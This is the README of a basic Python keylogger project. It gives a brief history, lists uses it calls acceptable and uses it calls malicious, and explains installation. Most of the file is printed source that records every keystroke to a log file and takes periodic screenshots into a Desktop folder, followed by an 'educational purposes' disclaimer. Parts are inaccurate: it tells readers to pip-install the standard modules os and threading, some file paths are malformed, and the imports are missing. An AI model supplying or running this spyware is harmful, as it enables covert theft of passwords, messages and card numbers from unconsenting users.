# Welcome Folks



## This is a basic Keylogger Programme

### About

Keyloggers first appeared on the scene in the late 80’s and early 90’s. One of the earliest keyloggers was writing by a man named Perry Kivolowitz. He posted his source code to net.unix-wizards, net.sources on November 17, 1983.  The program basically operated by locating character lists, or clists, as they were being built by the Unix kernel. <br/>
Keystroke logging, also known as _keylogging_, is simply tracking the keys that are struck on a keyboard. This can be done in multiple ways using a wide variety of hardware devices or software. The reason for its large threat to networks and their security is due to its covertness nature.  Most keyloggers show no signs of any intrusion within the system allowing for them to gain typed information without anyone having knowledge of its actions except for the user who installed it. With the proper keylogger installed on the correct machine a person could easily gain access to a company’s entire network infrastructure. In terms of system critical data or extremely privileged information this could cause problems for a vast amount of people very quickly.

### Applications
**Acceptable uses:**  <br/>
•	Parent monitoring child’s computer usage <br/>
•	Boss monitoring employee’s computer usage <br/>
•	Government retrieving information pertinent to a crime <br/>
<br/>
**Malicious uses:** <br/>
•	Cracking passwords <br/>
•	Gaining unauthorized information <br/>
•	Stealing credit card numbers <br/>
•	Reading sent emails or messages not intended for public viewing <br/>
•	Retrieving secret names <br/>
•	Stealing account numbers <br/>

### How to Use ?
First of all you need to install all the mentioned python libraries in your device (Here I am assuming that latest Python version is installed in your device).
<br/><b>Write the following commands in the cmd window:</b>

```
pip install mss
```

```
pip install pynput
```


```
pip install threading
```


```
pip install os
```

Once you are done with all these libraries, you can download the "Keylogger.py" script and open it in any of the Python IDE(` PyCharm, Jupyter Notebook, Spyder, IDLE..`)
<br/>
Now, when you Run the script it will ask for "A Time interval which you want to be there in between each interval" and once you give the input then the keyogger will start tracking.
<br/>
<br />
This Keylogger will make a new Directory on the Desktop named "Keylogger" where all the Screenshots and log file will be stored.

### How to Stop? 
In order to stop this Keylogger, you have to stop the python script. 


```python

count=0
keys=[]                  #List all the pressed keys


                                        
class IntervalTimer(Timer):         #Control the Time interval between each Screenshots
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)
            
            
def write_file(keys):                  #To write the keys to the Files
    with open("C:/Users /Desktop/Keylogger-master/log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:     	 #Replace Key_Space with " " in the main file
                f.write(" ")
            if k.find("enter")>0:    	  #Replace Key_Enter with "\n or nextline"
                f.write("\n")
            elif k.find("Key") == -1:   
                f.write(k)
                  

class keylogger_main:
    
    def _build_logs(self):   		#To create the directory which contains all the data
        if not os.path.exists('C:/Users/ Desktop/Keylogger-master'):
            os.mkdir('C:/Users/ Desktop/Keylogger-master')
            os.mkdir('C:/Users/ Desktop/Keylogger-master/Screenshots')
            os.mknod('C:/Users /Desktop/Keylogger-master/log.txt')
    
    def _on_press(self,k):       	#This Function keeps track of pressed keys
        global keys, count
        #print("{0} pressed".format(k))
        keys.append(k)
        count+=1
    
        if count >=10:
            count=0
            write_file(keys)
            keys=[]   
    
    def _keylogger(self):            #Main Funciton to start the key tracker
        with Listener(on_press=self._on_press) as listener:
            listener.join()
            
    def _Screenshot(self):          	 #Main Function to start thr Screenshot tracker
        sct=mss()
        sct.shot(output='C:/Users/Desktop/Keylogger-master/Screenshots/{}.png'.format(time.time()))
    
    def run(self,interval):       		   #Main fucntion to start the keylogger
        
        self._build_logs()
        Thread(target=self._keylogger).start()   #This thread function is used to Run the Keys and Screenshots tracker parallely
        IntervalTimer(interval, self._Screenshot).start()
        
        
km=keylogger_main() 
interval=int(input("Enter the time interval (in sec.) between each Screenshot:"))
km.run(interval)

```
 
Get the complete code [Here](https://github.com/Aryan529/Keylogger/) 


### Disclaimer
This undertaking is just for _Educational Purposes_ and the abuse of the data in this venture can result in criminal allegations brought against the people being referred to.<br/> 
I am in no way responsible for the misuse of the information.
